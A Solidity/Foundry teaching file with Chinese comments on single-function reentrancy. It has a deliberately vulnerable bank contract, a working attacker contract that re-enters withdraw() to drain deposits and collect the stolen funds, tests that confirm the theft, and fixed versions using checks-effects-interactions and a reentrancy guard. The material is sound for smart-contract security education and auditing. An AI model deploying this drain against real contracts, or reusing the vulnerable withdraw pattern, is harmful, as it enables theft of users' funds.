// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

/**
 * @title 单函数重入攻击示例
 * @notice 这是最经典的重入攻击场景 - 在同一个函数中重入
 * @dev 漏洞点：先转账，后更新状态（Checks-Effects-Interactions 模式违反）
 */

// ============ 漏洞合约 ============
contract VulnerableBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    
    // 存款函数
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // 漏洞函数：单函数重入
    function withdraw(uint256 _amount) external {
        // 检查：用户余额是否足够
        // 先把余额读到局部变量里（典型漏洞写法：外部调用前未更新状态）
        uint256 userBalance = balances[msg.sender];
        require(userBalance >= _amount, "Insufficient balance");
        
        // ❌ 漏洞：先转账（外部调用）
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        // ❌ 后更新状态（攻击者可以在转账时重入，此时状态还未更新）
        // 注意：使用局部变量写回，避免重入多层 unwind 时多次 -= 导致 0.8+ 下溢回滚
        balances[msg.sender] = userBalance - _amount;
        
        emit Withdraw(msg.sender, _amount);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ============ 攻击合约 ============
contract ReentrancyAttacker {
    VulnerableBank public bank;
    uint256 public attackAmount;
    uint256 public attackCount;
    uint256 public maxAttacks = 5; // 限制重入次数，避免gas耗尽
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    // 第一步：攻击者存款
    function fundAttack() external payable {
        attackAmount = msg.value;
        bank.deposit{value: msg.value}();
    }
    
    // 第二步：发起攻击
    function attack() external {
        console.log("=== Starting Attack ===");
        console.log("Bank balance before attack:", bank.getBalance());
        console.log("Attacker balance in bank:", bank.balances(address(this)));
        
        attackCount = 0;
        bank.withdraw(attackAmount);
        
        console.log("=== Attack Complete ===");
        console.log("Bank balance after attack:", bank.getBalance());
        console.log("Attacker stole:", address(this).balance);
    }
    
    // 关键：receive函数中实现重入逻辑
    receive() external payable {
        attackCount++;
        
        console.log("--- Reentrancy #", attackCount, "---");
        console.log("Received:", msg.value);
        console.log("Bank balance:", bank.getBalance());
        console.log("My balance in bank records:", bank.balances(address(this)));
        
        // 继续重入，直到银行余额不足或达到攻击次数上限
        if (attackCount < maxAttacks && bank.getBalance() >= attackAmount) {
            console.log("Reentering withdraw()...");
            bank.withdraw(attackAmount);
        } else {
            console.log("Stopping attack - Bank drained or max attacks reached");
        }
    }
    
    // 提取窃取的资金
    function collectStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}

// ============ Foundry 测试 ============
contract ReentrancyTest is Test {
    VulnerableBank public bank;
    ReentrancyAttacker public attacker;
    
    address public victim1 = address(0x1);
    address public victim2 = address(0x2);
    address public attackerOwner = address(0x3);
    
    function setUp() public {
        // 部署漏洞合约
        bank = new VulnerableBank();
        
        // 模拟正常用户存款
        vm.deal(victim1, 5 ether);
        vm.deal(victim2, 5 ether);
        
        vm.prank(victim1);
        bank.deposit{value: 5 ether}();
        
        vm.prank(victim2);
        bank.deposit{value: 5 ether}();
        
        console.log("=== Initial Setup ===");
        console.log("Bank total balance:", bank.getBalance());
        console.log("Victim1 balance in bank:", bank.balances(victim1));
        console.log("Victim2 balance in bank:", bank.balances(victim2));
    }
    
    function testReentrancyAttack() public {
        // 部署攻击合约
        attacker = new ReentrancyAttacker(address(bank));
        
        // 给攻击者资金
        vm.deal(attackerOwner, 1 ether);
        
        // 攻击者存入1 ether
        vm.startPrank(attackerOwner);
        attacker.fundAttack{value: 1 ether}();
        
        console.log("\n=== Before Attack ===");
        uint256 bankBalanceBefore = bank.getBalance();
        uint256 attackerBalanceBefore = address(attacker).balance;
        
        console.log("Bank balance:", bankBalanceBefore);
        console.log("Attacker contract balance:", attackerBalanceBefore);
        
        // 执行攻击
        console.log("\n");
        attacker.attack();
        
        console.log("\n=== After Attack ===");
        uint256 bankBalanceAfter = bank.getBalance();
        uint256 attackerBalanceAfter = address(attacker).balance;
        uint256 stolen = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("Bank balance:", bankBalanceAfter);
        console.log("Attacker contract balance:", attackerBalanceAfter);
        console.log("Amount stolen:", stolen);
        
        // 验证攻击成功
        assertTrue(stolen > 1 ether, "Attack should steal more than initial deposit");
        assertTrue(bankBalanceAfter < bankBalanceBefore, "Bank balance should decrease");
        
        // 攻击者提取资金
        attacker.collectStolenFunds();
        console.log("\nAttacker owner final balance:", attackerOwner.balance);
        
        vm.stopPrank();
    }
    
    function testReentrancyMechanism() public {
        // 这个测试展示攻击的具体机制
        attacker = new ReentrancyAttacker(address(bank));
        vm.deal(attackerOwner, 1 ether);
        
        vm.startPrank(attackerOwner);
        attacker.fundAttack{value: 1 ether}();
        
        console.log("\n=== Understanding the Attack Mechanism ===");
        console.log("1. Attacker deposits 1 ETH");
        console.log("   Bank balance:", bank.getBalance());
        console.log("   Attacker's balance in bank:", bank.balances(address(attacker)));
        
        console.log("\n2. Attacker calls withdraw(1 ETH)");
        console.log("   Bank checks: balances[attacker] >= 1 ETH? YES");
        console.log("   Bank sends 1 ETH to attacker (triggers receive())");
        console.log("   BEFORE balances[attacker] is updated!");
        
        console.log("\n3. In receive(), attacker calls withdraw(1 ETH) AGAIN");
        console.log("   Bank checks: balances[attacker] >= 1 ETH? STILL YES!");
        console.log("   (Because balances wasn't updated yet)");
        console.log("   Bank sends another 1 ETH...");
        
        console.log("\n4. This repeats until bank runs out of ETH or gas limit");
        
        vm.stopPrank();
    }
}

// ============ 修复版本 ============
/**
 * @title 安全的银行合约（遵循 CEI 模式）
 * @notice Checks-Effects-Interactions 模式
 */
contract SecureBank {
    mapping(address => uint256) public balances;
    
    event Deposit(address indexed user, uint256 amount);
    event Withdraw(address indexed user, uint256 amount);
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // ✅ 安全版本：遵循 CEI 模式
    function withdraw(uint256 _amount) external {
        // 1. Checks（检查）
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        // 2. Effects（状态更新）- 先更新状态！
        balances[msg.sender] -= _amount;
        
        // 3. Interactions（外部调用）- 最后才进行外部交互
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        emit Withdraw(msg.sender, _amount);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

// ============ 使用 ReentrancyGuard 的版本 ============
/**
 * @title 使用OpenZeppelin ReentrancyGuard
 * @notice 另一种防御方式：使用互斥锁
 */
abstract contract ReentrancyGuard {
    uint256 private constant NOT_ENTERED = 1;
    uint256 private constant ENTERED = 2;
    uint256 private _status;
    
    constructor() {
        _status = NOT_ENTERED;
    }
    
    modifier nonReentrant() {
        require(_status != ENTERED, "ReentrancyGuard: reentrant call");
        _status = ENTERED;
        _;
        _status = NOT_ENTERED;
    }
}

contract SecureBankWithGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // ✅ 使用 nonReentrant modifier
    function withdraw(uint256 _amount) external nonReentrant {
        require(balances[msg.sender] >= _amount, "Insufficient balance");
        
        (bool success, ) = msg.sender.call{value: _amount}("");
        require(success, "Transfer failed");
        
        balances[msg.sender] -= _amount;
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}


/**
 * ============ 知识点总结 ============
 * 
 * 1. 单函数重入攻击原理：
 *    - 在外部调用（transfer/call）时，控制权转移给接收方
 *    - 接收方可以在 receive()/fallback() 中再次调用原函数
 *    - 如果状态还未更新，检查会再次通过
 * 
 * 2. 为什么能成功？
 *    - 漏洞合约在转账BEFORE更新余额
 *    - 每次重入时，balances[attacker]还是原来的值
 *    - 可以多次提取同一笔余额
 * 
 * 3. 防御方法：
 *    a) CEI模式（Checks-Effects-Interactions）
 *       - 先检查条件
 *       - 再更新状态
 *       - 最后外部调用
 *    
 *    b) ReentrancyGuard
 *       - 使用互斥锁（mutex）
 *       - 函数执行期间不允许再次进入
 *    
 *    c) Pull over Push
 *       - 不主动发送ETH（push）
 *       - 让用户自己来取（pull）
 * 
 * 4. 真实案例：
 *    - The DAO (2016) - 损失 $60M
 *    - Lendf.me (2020) - 损失 $25M
 *    - Curve vyper (2023) - 损失 $73M
 * 
 * 5. 审计要点：
 *    - 查找所有external call
 *    - 检查调用前后的状态更新顺序
 *    - 特别注意：call, transfer, send, delegatecall
 *    - 任何可能触发回调的操作都要警惕
 */

// 运行：forge test --match-contract ReentrancyTest -vv